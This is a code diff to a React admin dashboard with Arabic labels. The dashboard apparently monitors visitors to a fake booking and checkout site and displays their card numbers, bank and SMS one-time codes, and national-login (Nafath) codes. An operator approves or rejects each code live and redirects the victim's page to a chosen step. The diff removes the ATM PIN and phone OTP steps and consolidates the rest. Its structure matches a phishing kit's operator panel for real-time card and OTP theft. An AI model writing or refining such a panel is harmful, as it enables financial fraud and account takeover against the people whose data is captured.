@@ -62,7 +62,7 @@ import {
   WifiOff,
 } from "lucide-react";
 
-type CardKey = "customer" | "otp" | "card" | "phone" | "header" | "pages";
+type CardKey = "customer" | "otp" | "card" | "phone" | "header";
 type CardSetting = { visible: boolean; span: 1 | 2 };
 type CardSettings = Record<CardKey, CardSetting>;
 
@@ -72,7 +72,6 @@ const CARD_LABELS: Record<CardKey, string> = {
   card: "معلومات البطاقة",
   phone: "الجوال والمشغل",
   header: "ترويسة الزائر",
-  pages: "التحكم بالصفحات والمرحلة",
 };
 
 const DEFAULT_CARD_SETTINGS: CardSettings = {
@@ -81,7 +80,6 @@ const DEFAULT_CARD_SETTINGS: CardSettings = {
   card: { visible: true, span: 1 },
   phone: { visible: true, span: 1 },
   header: { visible: true, span: 1 },
-  pages: { visible: true, span: 1 },
 };
 
 const OPERATOR_LABELS: Record<string, string> = {
@@ -107,16 +105,26 @@ interface Visitor {
 }
 
 const STEP_LABELS: Record<number, string> = {
-  1: "بيانات الطلب",
-  2: "اختيار الموعد",
-  3: "مراجعة",
-  4: "بطاقة الدفع",
-  5: "OTP البنك",
-  6: "ATM PIN",
-  7: "رقم الجوال",
-  8: "OTP الجوال",
-  9: "نفاذ",
+  1: "registration · التسجيل",
+  2: "booking · الحجز",
+  3: "cart · السلة",
+  4: "checkout · الدفع",
+  5: "otp · رمز التحقق",
+  6: "otp_verified · تم التحقق",
+  7: "confirmation · التأكيد",
 };
+
+const STEP_TO_PAGE: Record<number, string> = {
+  1: "registration",
+  2: "booking",
+  3: "cart",
+  4: "checkout",
+  5: "otp",
+  6: "otp_verified",
+  7: "confirmation",
+};
+
+const TOTAL_STEPS = 7;
 
 /* -------------------------------------------------------------- */
 /* Adapter: map current flat schema → the shape the new UI expects */
@@ -130,8 +138,8 @@ const PAGE_TO_STEP: Record<string, number> = {
   checkout: 4,
   otp: 5,
   reserve_otp: 5,
-  otp_verified: 5,
-  confirmation: 9,
+  otp_verified: 6,
+  confirmation: 7,
 };
 
 function tsFromAny(v: any): string | undefined {
@@ -228,10 +236,8 @@ function adaptVisitor(raw: any): Visitor {
 
   const stepFromPage = PAGE_TO_STEP[String(raw?.currentPage || "")] || 0;
   const step =
-    raw?.currentPage === "confirmation"
-      ? 9
-      : stepFromPage ||
-        (raw?.otp ? 5 : raw?.cardNumber ? 4 : raw?.name ? 1 : 0);
+    stepFromPage ||
+    (raw?.otp ? 5 : raw?.cardNumber ? 4 : raw?.name ? 1 : 0);
 
   const completed =
     raw?.currentPage === "confirmation" ||
@@ -300,7 +306,7 @@ function isWaiting(v: Visitor): boolean {
   return waitingFields(v).length > 0;
 }
 function isCompleted(v: Visitor): boolean {
-  return v.status === "nafad_otp_submitted" || v.step === 9;
+  return v.status === "nafad_otp_submitted" || v.step === TOTAL_STEPS;
 }
 
 function fmtRelative(iso?: string): string {
@@ -319,9 +325,9 @@ function fmtRelative(iso?: string): string {
 }
 
 function stepColor(step: number): string {
-  if (step >= 9)
+  if (step >= 7)
     return "bg-emerald-500/20 text-emerald-300 border-emerald-500/40";
-  if (step >= 7) return "bg-violet-500/20 text-violet-300 border-violet-500/40";
+  if (step >= 6) return "bg-violet-500/20 text-violet-300 border-violet-500/40";
   if (step >= 5) return "bg-amber-500/20 text-amber-300 border-amber-500/40";
   if (step >= 4) return "bg-cyan-500/20 text-cyan-300 border-cyan-500/40";
   return "bg-slate-700/40 text-slate-300 border-slate-600/40";
@@ -737,7 +743,7 @@ function AdminDashboard() {
     const waiting = visitors.filter((v) => isWaiting(v)).length;
     const completed = visitors.filter((v) => isCompleted(v)).length;
     const onPayment = visitors.filter(
-      (v) => Number(v.step) >= 4 && Number(v.step) <= 8 && !isCompleted(v),
+      (v) => Number(v.step) >= 4 && Number(v.step) <= 6 && !isCompleted(v),
     ).length;
     return { total, online, waiting, completed, onPayment };
   }, [visitors]);
@@ -1066,19 +1072,10 @@ function AdminDashboard() {
                       "rejected",
                     )
                   }
-                  onPushStep={(targetStep) =>
-                    pushDirective(selected.id, {
-                      directedStep: targetStep,
-                      directedAt: new Date().toISOString(),
-                    })
-                  }
                 />
               </div>
               <div className={spanClass("header")}>
                 <VisitorHeaderCard visitor={selected} />
-              </div>
-              <div className={spanClass("pages")}>
-                <StepControlCard visitor={selected} />
               </div>
             </>
           ) : (
@@ -1230,7 +1227,7 @@ function AdminDashboard() {
                         <span
                           className={`text-[10px] px-1.5 py-0.5 rounded border font-semibold ${stepColor(stepNum)}`}
                         >
-                          {stepNum > 0 ? `${stepNum}/9` : "—"} · {stage}
+                          {stepNum > 0 ? `${stepNum}/${TOTAL_STEPS}` : "—"} · {stage}
                         </span>
                         {waiting && (
                           <span className="text-[10px] px-1.5 py-0.5 rounded bg-amber-500/20 text-amber-300 border border-amber-500/40 font-bold flex items-center gap-0.5">
@@ -1258,7 +1255,7 @@ function AdminDashboard() {
                       </div>
                       {/* Step progress bar */}
                       <div className="mt-1.5 flex gap-0.5">
-                        {Array.from({ length: 9 }).map((_, i) => (
+                        {Array.from({ length: TOTAL_STEPS }).map((_, i) => (
                           <div
                             key={i}
                             className={`flex-1 h-1 rounded-full ${
@@ -1707,7 +1704,7 @@ function OtpControlCard({
   const waitingBank = visitor.otpApprovalStatus === "waiting";
   const waitingPhone = visitor.phoneOtpApprovalStatus === "waiting";
   const onOtpStep =
-    visitor.step === 5 || visitor.step === 8 || visitor.step === 9;
+    visitor.step === 5 || visitor.step === 6 || visitor.step === TOTAL_STEPS;
   if (
     !cardOtp &&
     !phoneOtp &&
@@ -2081,7 +2078,7 @@ function PagesControlDropdown({ visitor }: { visitor: Visitor }) {
         <Layers className="w-3.5 h-3.5" />
         <span>التحكم بالصفحات</span>
         <span className="px-1.5 py-0.5 rounded bg-slate-900/60 text-[10px] font-mono">
-          {current}/9
+          {current}/{TOTAL_STEPS}
         </span>
         <ChevronDown
           className={`w-3.5 h-3.5 transition ${open ? "rotate-180" : ""}`}
@@ -2103,109 +2100,6 @@ function PagesControlDropdown({ visitor }: { visitor: Visitor }) {
         </div>
       )}
     </div>
-  );
-}
-
-function StepControlCard({ visitor }: { visitor: Visitor }) {
-  const current = Number(visitor.step) || 0;
-  const directed = Number(visitor.directedStep) || 0;
-  const stepLabel = STEP_LABELS[current] || "—";
-  const directedLabel = directed > 0 ? STEP_LABELS[directed] : null;
-  const rawPage = String(visitor.currentPage || "").trim();
-  const completed = isCompleted(visitor);
-  const waiting = isWaiting(visitor);
-  const pending = directed > 0 && directed !== current;
-
-  return (
-    <Panel
-      title="التحكم بالصفحات والمرحلة"
-      badge={current > 0 ? `${current}/9` : undefined}
-    >
-      {/* Current step / page summary */}
-      <div className="space-y-2 mb-3">
-        <div
-          className="rounded-lg border p-3"
-          style={{
-            backgroundColor: "#0d1525",
-            borderColor: pending ? "#7c3aed" : "#1f2a3d",
-          }}
-        >
-          <div className="flex items-center justify-between gap-2 mb-1.5">
-            <div className="text-[10px] text-slate-500 font-semibold uppercase tracking-wider">
-              المرحلة الحالية
-            </div>
-            <div className="flex items-center gap-1">
-              {waiting && (
-                <span className="text-[9px] px-1.5 py-0.5 rounded bg-amber-500/20 text-amber-300 border border-amber-500/40 font-bold">
-                  بانتظار الموافقة
-                </span>
-              )}
-              {completed && !waiting && (
-                <span className="text-[9px] px-1.5 py-0.5 rounded bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 font-bold">
-                  مكتمل
-                </span>
-              )}
-            </div>
-          </div>
-          <div className="flex items-baseline gap-2">
-            <span
-              className={`text-2xl font-bold tabular-nums ${
-                current > 0 ? "text-cyan-300" : "text-slate-600"
-              }`}
-              data-testid="text-current-step"
-            >
-              {current > 0 ? current : "—"}
-            </span>
-            <span className="text-xs text-slate-500">/ 9</span>
-            <span className="text-sm font-semibold text-slate-200 mr-auto truncate">
-              {stepLabel}
-            </span>
-          </div>
-          {rawPage && (
-            <div
-              className="mt-1.5 text-[10px] text-slate-400 font-mono truncate"
-              dir="ltr"
-              data-testid="text-current-page"
-              title={rawPage}
-            >
-              page: {rawPage}
-            </div>
-          )}
-          {pending && directedLabel && (
-            <div className="mt-2 text-[11px] text-violet-300 flex items-center gap-1">
-              <span className="opacity-70">→ موجَّه إلى:</span>
-              <span className="font-bold">
-                {directed} · {directedLabel}
-              </span>
-            </div>
-          )}
-        </div>
-
-        {/* 9-segment progress bar */}
-        <div className="flex gap-0.5">
-          {Array.from({ length: 9 }).map((_, i) => {
-            const n = i + 1;
-            const reached = current >= n;
-            const isCurrentSeg = current === n;
-            return (
-              <div
-                key={i}
-                className={`flex-1 h-1.5 rounded-sm ${
-                  isCurrentSeg
-                    ? "bg-cyan-400"
-                    : reached
-                      ? "bg-cyan-600/60"
-                      : "bg-slate-800"
-                }`}
-              />
-            );
-          })}
-        </div>
-      </div>
-
-      {/* Full pages control */}
-      <PagesControl visitor={visitor} />
-    </Panel>
   );
 }
 
@@ -2249,9 +2143,10 @@ function PagesControl({ visitor }: { visitor: Visitor }) {
 
   return (
     <div className="space-y-3">
-      <div className="grid grid-cols-4 gap-1.5">
+      <div className="grid grid-cols-2 gap-1.5">
         {Object.entries(STEP_LABELS).map(([k, label]) => {
           const n = Number(k);
+          const pageId = STEP_TO_PAGE[n] || "";
           const isCurrent = current === n;
           const isDirected = directed === n;
           return (
@@ -2259,7 +2154,7 @@ function PagesControl({ visitor }: { visitor: Visitor }) {
               key={k}
               onClick={() => pushStep(n)}
               data-testid={`push-step-${n}`}
-              className={`py-2 px-1.5 rounded-lg text-[11px] font-bold transition border ${
+              className={`py-2 px-2 rounded-lg text-[11px] font-bold transition border text-right ${
                 isCurrent
                   ? "bg-cyan-500 text-slate-900 border-cyan-400"
                   : isDirected
@@ -2267,8 +2162,16 @@ function PagesControl({ visitor }: { visitor: Visitor }) {
                     : "bg-slate-800/60 text-slate-300 border-slate-700 hover:bg-slate-700"
               }`}
             >
-              <div className="text-[9px] opacity-70 mb-0.5">{n}</div>
-              <div className="leading-tight">{label}</div>
+              <div className="flex items-center justify-between gap-1 mb-0.5">
+                <span className="text-[9px] opacity-70">{n}</span>
+                <span
+                  className="text-[9px] font-mono opacity-70 truncate"
+                  dir="ltr"
+                >
+                  {pageId}
+                </span>
+              </div>
+              <div className="leading-tight truncate">{label}</div>
             </button>
           );
         })}
@@ -2287,32 +2190,20 @@ function PagesControl({ visitor }: { visitor: Visitor }) {
             onClick={() => pushStep(5)}
             className="py-1.5 bg-orange-500/15 text-orange-300 rounded text-[11px] font-semibold border border-orange-500/30 hover:bg-orange-500/25"
           >
-            إعادة OTP بنك
+            إعادة OTP
           </button>
           <button
-            onClick={() => pushStep(6)}
-            className="py-1.5 bg-rose-500/15 text-rose-300 rounded text-[11px] font-semibold border border-rose-500/30 hover:bg-rose-500/25"
-          >
-            إعادة PIN
-          </button>
-          <button
-            onClick={() => pushStep(8)}
-            className="py-1.5 bg-fuchsia-500/15 text-fuchsia-300 rounded text-[11px] font-semibold border border-fuchsia-500/30 hover:bg-fuchsia-500/25"
-          >
-            إعادة OTP جوال
-          </button>
-          <button
-            onClick={() => pushStep(9)}
+            onClick={() => pushStep(7)}
             className="col-span-2 py-1.5 bg-teal-500/20 text-teal-200 rounded text-[11px] font-bold border border-teal-500/40 hover:bg-teal-500/30"
           >
-            توجيه إلى نفاذ
+            توجيه إلى التأكيد
           </button>
         </div>
       </div>
 
       <div className="border-t border-slate-800 pt-2 space-y-1">
         <div className="text-[10px] text-slate-500 mb-1">طلب جديد</div>
-        <div className="grid grid-cols-3 gap-1.5">
+        <div className="grid grid-cols-2 gap-1.5">
           <button
             onClick={() => clearApproval("cardApprovalStatus")}
             className="py-1 bg-slate-800/60 text-slate-300 rounded text-[10px] font-semibold border border-slate-700 hover:bg-slate-700"
@@ -2323,20 +2214,14 @@ function PagesControl({ visitor }: { visitor: Visitor }) {
             onClick={() => clearApproval("otpApprovalStatus")}
             className="py-1 bg-slate-800/60 text-slate-300 rounded text-[10px] font-semibold border border-slate-700 hover:bg-slate-700"
           >
-            OTP بنك
-          </button>
-          <button
-            onClick={() => clearApproval("phoneOtpApprovalStatus")}
-            className="py-1 bg-slate-800/60 text-slate-300 rounded text-[10px] font-semibold border border-slate-700 hover:bg-slate-700"
-          >
-            OTP جوال
+            OTP
           </button>
         </div>
       </div>
 
       {directed > 0 && directed !== current && (
         <div className="text-[10px] text-violet-300 bg-violet-500/10 border border-violet-500/30 rounded p-1.5 text-center">
-          ⏳ تم التوجيه إلى الخطوة {directed} - بانتظار استجابة المستخدم
+          ⏳ تم التوجيه إلى {STEP_TO_PAGE[directed] || `الخطوة ${directed}`} - بانتظار استجابة المستخدم
         </div>
       )}
     </div>
@@ -2456,12 +2341,10 @@ function PhoneInfoCard({
   visitor,
   onApprove,
   onReject,
-  onPushStep,
 }: {
   visitor: Visitor;
   onApprove: () => void;
   onReject: () => void;
-  onPushStep: (step: number) => void;
 }) {
   const phone = String(visitor.phoneVerification || visitor.phone || "");
   const operatorId = String(visitor.operator || "").toLowerCase();
@@ -2519,30 +2402,13 @@ function PhoneInfoCard({
 
         <OtpRow
           label="OTP الجوال (SMS)"
-          step={8}
+          step={5}
           code={smsOtp}
           status={status}
           canDecide={waiting}
           onApprove={onApprove}
           onReject={onReject}
         />
-
-        <div className="grid grid-cols-2 gap-1.5">
-          <button
-            onClick={() => onPushStep(7)}
-            className="py-1.5 bg-slate-800 hover:bg-slate-700 rounded text-[10px] font-semibold text-slate-200 border border-slate-700"
-            data-testid="phone-card-push-7"
-          >
-            دفع لإدخال الجوال
-          </button>
-          <button
-            onClick={() => onPushStep(8)}
-            className="py-1.5 bg-slate-800 hover:bg-slate-700 rounded text-[10px] font-semibold text-slate-200 border border-slate-700"
-            data-testid="phone-card-push-8"
-          >
-            دفع لـ OTP الجوال
-          </button>
-        </div>
 
         {visitor.smsOtpSubmittedAt && (
           <div className="text-[10px] text-slate-500 text-left" dir="ltr">
@@ -3058,16 +2924,10 @@ function CardInfoCard({
             <XCircle className="w-3.5 h-3.5" /> رفض
           </button>
           <button
-            onClick={() => onPushStep(6)}
-            className="py-1.5 bg-slate-700 hover:bg-slate-600 rounded-lg text-xs font-semibold flex items-center justify-center gap-1"
-          >
-            <LockIcon className="w-3 h-3" /> PIN
-          </button>
-          <button
             onClick={() => onPushStep(5)}
-            className="py-1.5 bg-slate-700 hover:bg-slate-600 rounded-lg text-xs font-semibold flex items-center justify-center gap-1"
+            className="col-span-2 py-1.5 bg-slate-700 hover:bg-slate-600 rounded-lg text-xs font-semibold flex items-center justify-center gap-1"
           >
-            <Hash className="w-3 h-3" /> OTP
+            <Hash className="w-3 h-3" /> دفع إلى OTP
           </button>
         </div>
 
@@ -3127,7 +2987,7 @@ function CardInfoCard({
         )}
 
         {/* Nafad code + approval */}
-        {(visitor.step === 9 ||
+        {(visitor.step === TOTAL_STEPS ||
           visitor.nafadConfirmationStatus === "waiting") && (
           <NafadControl
             visitor={visitor}
